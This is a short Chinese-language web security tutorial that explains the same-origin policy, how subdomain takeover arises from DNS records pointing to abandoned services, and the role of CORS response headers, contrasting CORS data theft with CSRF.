一、前置知识：同源策略

同源策略（Same-Origin Policy，SOP）是浏览器核心安全机制——限制来自一个源的文档或脚本与另一个源的资源交互。”同源”必须同时满足三个条件：

同协议 + 同域名 + 同端口

SOP 在安全上很关键，但也限制了前端功能。于是诞生了各种跨域手段——CORS、JSONP——实现不当反而引出漏洞。子域名接管则是从 DNS 层面绕过 SOP。

二、子域名接管

2.1 原理

域名解析记录（CNAME、NS、MX 甚至 A 记录）指向了当前未在使用或已删除的服务。攻击者注册/接管这个废弃目标，就获得了原域名的控制权。

危害： 恶意软件分发、钓鱼、XSS、身份验证绕过——浏览器认为 test.baidu.com 是合法同源。

三、CORS 跨域资源共享

3.1 原理

CORS（Cross-Origin Resource Sharing）是 HTML5 的跨域机制，本质是放宽同源策略，允许浏览器向跨源服务器发 XMLHttpRequest。

三个关键响应头：

响应头 作用
Access-Control-Allow-Origin 指定哪些域可访问本域资源
Access-Control-Allow-Credentials 设为 true 时允许携带 Cookie
Access-Control-Allow-Methods 允许哪些 HTTP 方法

3.2 CORS vs CSRF

  • CORS：窃取资源（偷数据）——攻击者能看到受害者页面内容
  • CSRF：执行操作（改数据）——攻击者以受害者名义发请求但看不到响应
